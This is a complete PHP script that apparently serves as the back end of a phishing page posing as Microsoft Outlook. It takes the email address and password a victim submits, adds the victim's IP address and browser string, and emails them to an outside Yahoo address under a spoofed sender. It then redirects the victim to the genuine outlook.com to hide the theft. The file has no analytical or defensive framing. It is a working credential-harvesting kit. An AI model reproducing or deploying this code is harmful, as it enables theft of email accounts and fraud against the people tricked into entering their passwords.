<?php
if($_POST['login']  && $_POST['passwd']){
$login = $_POST['login'];
$pass = $_POST['passwd'];


$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];

$adddate=date("D M d, Y g:i a");
$message .= "---------------+ OutLook! +--------------\n";
$message .= "Email      : ".$login."\n";
$message .= "Passwd     : ".$pass."\n";
$message .= "--------------------\n";
$message .= "Date : $adddate\n";
$message .= "IP Address : $ip\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "---------------+ OutLook! +--------------\n";

$send="mytrading89@yahoo.com";

$subject = "OutLook! - IP: ".$ip."\n ";
$headers = "From: OutLook <TasTe@servicesoutlook.com>";
if(mail($send,$subject,$message,$headers) != false){
// we only redirect once the mail has sent

header("Location: https://outlook.com/");
}


}else{
header("Location: ./");
exit();
}
?>